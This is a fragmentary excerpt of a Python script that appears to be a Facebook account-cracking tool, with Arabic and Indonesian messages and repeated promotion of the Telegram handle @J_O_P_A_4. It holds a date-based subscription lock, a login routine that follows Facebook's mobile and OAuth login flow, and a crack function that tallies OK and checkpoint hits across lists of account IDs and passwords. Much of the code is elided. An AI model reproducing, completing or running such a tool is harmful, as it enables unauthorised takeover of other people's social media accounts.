...
g= datetime.datetime(2023, 9, 6, 0, 0 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'تم توقيف اداة راسل المبرمج لتفعيله @J_O_P_A_4')
 print('\n\n')
 print(x)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @J_O_P_A_4')
    print('\n\n')
    print(x)
...
try:
        ...
        cetak(nel('\t• المطور حوبا يكتسح الساحه •'))
...
#--------------------------------------------
  ...
  %s{%s03%s} validate
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @J_O_P_A_4_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
...
def login_lagi334():
	try:
		banner()
		cetak(nel('\t©©© المطور جوبا : [green]@J_O_P_A_4[white] ©©©'))
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print('')
							print(f"{x}[{h}√{x}]{h} تم تسجيل الدخول بنجاح !!!!{x} ");time.sleep(1);exit()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	print('\033[1;32mقناتي على التلجرام بشرفني اشتراككم @J_O_P_A_4')
	print('')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s <@J_O_P_A_4> %s/%s » [OK] %s » [CP] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
